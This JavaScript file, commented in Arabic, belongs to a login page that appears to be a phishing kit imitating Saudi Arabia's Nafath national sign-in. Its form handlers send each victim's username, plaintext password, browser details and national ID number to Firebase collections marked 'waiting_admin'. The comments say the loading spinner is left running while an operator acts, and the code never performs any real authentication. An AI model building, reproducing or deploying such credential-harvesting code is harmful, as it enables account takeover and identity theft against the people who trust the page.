// script.js

// استيراد قاعدة البيانات من الملف الخارجي المخصّص لـ Firebase
import { db } from "./firebase-config.js";

// استيراد الدوال المطلوبة من حزمة Firestore الرسمية عبر الـ CDN
import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

document.addEventListener('DOMContentLoaded', () => {
    
    // ==========================================
    // 1. تفاعلات الصفحة الرئيسية (Index Page)
    // ==========================================
    const loginCard = document.getElementById('loginCard');
    if (loginCard) {
        loginCard.addEventListener('click', () => {
            loginCard.style.transform = 'scale(0.95)';
            setTimeout(() => {
                window.location.href = 'login.html';
            }, 150);
        });
    }

    // ==========================================
    // 2. نظام التبويب والأكورديون الديناميكي (Accordion System)
    // ==========================================
    const tabs = document.querySelectorAll('.accordion-item');
    const panels = document.querySelectorAll('.form-panel-card');

    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            // التنفيذ فقط إذا كان التبويب المختار مغلقاً حالياً
            if (tab.classList.contains('collapsed')) {
                
                // إذا نقر المستخدم على تبويب تطبيق نفاذ، نظهر التنبيه أولاً قبل التبديل
           
                // أ) تحويل كافة التبويبات للحالة المغلقة وتغيير الأيقونات لـ (+)
                tabs.forEach(t => {
                    t.classList.remove('active');
                    t.classList.add('collapsed');
                    const icon = t.querySelector('.status-icon');
                    if (icon) {
                        icon.classList.remove('fa-minus');
                        icon.classList.add('fa-plus');
                    }
                });

                // ب) إخفاء جميع لوحات النماذج
                panels.forEach(p => {
                    p.classList.add('hidden-panel');
                });

                // ج) تنشيط التبويب الحالي المختار وتحويل أيقونته لـ (-)
                tab.classList.remove('collapsed');
                tab.classList.add('active');
                const currentIcon = tab.querySelector('.status-icon');
                if (currentIcon) {
                    currentIcon.classList.remove('fa-plus');
                    currentIcon.classList.add('fa-minus');
                }

                // د) إظهار اللوحة المستهدفة المربوطة بالتبويب النشط
                const targetPanelId = tab.getAttribute('data-target');
                const targetPanel = document.getElementById(targetPanelId);
                if (targetPanel) {
                    targetPanel.classList.remove('hidden-panel');
                }
            }
        });
    });

   // ==========================================
    // 3. معالجة إرسال النماذج وتخزينها وظهور اللودر
    // ==========================================
    const globalLoader = document.getElementById('globalLoader');
    
    // أ) نموذج اسم المستخدم وكلمة المرور الأصلي
    const authForm = document.getElementById('authForm');
    if (authForm) {
        authForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const usernameInput = document.getElementById('username').value;
            const passwordInput = document.getElementById('password').value;
            
            // إظهار اللودر الزجاجي في منتصف الشاشة فوراً
            if (globalLoader) globalLoader.classList.remove('hidden-loader');
            
            try {
                // إرسال البيانات إلى الفايربيس
                await addDoc(collection(db, "users_login"), {
                    username: usernameInput,
                    password: passwordInput,
                    timestamp: serverTimestamp(),
                    device: navigator.userAgent,
                    status: "waiting_admin" // حالة الطلب بانتظار الأدمن
                });

                // نترك اللودر ظاهر شغال، أو يمكنك إخفاؤه بعد نجاح الإرسال بـ alert
                // إذا أردت استمرار اللودر حتى يوافق الأدمن، اترك السطر القادم ملغياً
                // globalLoader.classList.add('hidden-loader'); 
                
            } catch (error) {
                console.error("خطأ: ", error);
                alert('عذراً، حدث خطأ في الاتصال بالشبكة.');
                if (globalLoader) globalLoader.classList.add('hidden-loader'); // إخفاء عند الخطأ
            }
        });
    }

    // ب) نموذج رقم بطاقة الأحوال (الخاص بتبويب تطبيق نفاذ)
    const appForm = document.getElementById('appForm');
    if (appForm) {
        appForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const nationalIdInput = document.getElementById('nationalId').value;
            
            // إظهار اللودر الزجاجي في منتصف الشاشة فوراً
            if (globalLoader) globalLoader.classList.remove('hidden-loader');
            
            try {
                await addDoc(collection(db, "nafath_app_requests"), {
                    nationalId: nationalIdInput,
                    timestamp: serverTimestamp(),
                    status: "waiting_admin" // بانتظار الأدمن
                });
                
            } catch (error) {
                console.error("خطأ: ", error);
                alert('فشل إرسال الطلب.');
                if (globalLoader) globalLoader.classList.add('hidden-loader');
            }
        });
    }
    // ==========================================
    // 4. زر تبديل اللغة وإدارة اتجاه الصفحة (مشترك)
    // ==========================================
    const langSwitch = document.getElementById('langSwitch');
    if (langSwitch) {
        langSwitch.addEventListener('click', () => {
            const currentLang = langSwitch.querySelector('span').innerText.trim();
            if (currentLang === 'عربي') {
                langSwitch.querySelector('span').innerText = 'English';
                document.documentElement.setAttribute('dir', 'rtl');
                document.documentElement.setAttribute('lang', 'ar');
                document.body.style.direction = 'rtl';
            } else {
                langSwitch.querySelector('span').innerText = 'عربي';
                document.documentElement.setAttribute('dir', 'ltr');
                document.documentElement.setAttribute('lang', 'en');
                document.body.style.direction = 'ltr';
            }
        });
    }
});
